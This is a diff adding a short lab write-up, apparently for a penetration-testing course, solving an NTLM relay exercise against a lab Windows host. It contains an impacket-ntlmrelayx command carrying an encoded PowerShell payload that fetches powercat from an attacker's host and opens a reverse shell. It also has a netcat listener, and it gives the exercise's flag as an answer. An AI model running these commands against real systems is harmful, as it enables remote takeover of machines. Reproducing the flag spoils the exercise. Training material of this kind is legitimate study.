@@ -1,0 +1,27 @@
+Questions 1
+Use the methods from this section to get access to VM #2 (FILES02) of VM Group 1 and obtain the flag on the desktop of the user files02admin. If the bind shell on VM #1 is terminated it may take up to 1 minute until it is accessible again.
+
+HINT
+For base64 encoding, use the commands provided in Listing 32 of ""Using Executable Files"" in Common Web Application Attacks module.
+Use the commands provided in Listing 52 of this learning unit to relay your powershell commands.
+
+# Prepare one liner of the powershell
+Refer to pwsh-revshell.ps1 #Options 2
+
+python3 -m http.server 80
+
+# Netcat listen
+nc -lvnp 6688
+
+# Exploit
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.192.212 -c "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA4AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAIABwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4ANAA1AC4AMQA3ADgAIAAtAHAAIAA2ADYAOAA4ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA="
+
+# Troubleshooting Impacket show missing errors
+git clone https://github.com/CoreSecurity/impacket.git
+cd impacket
+python setup.py install
+
+PS C:\Users\files02admin\Desktop> cat flag.txt
+cat flag.txt
+OS{6c5ae9778d13c2197418cd20b674101c}
+
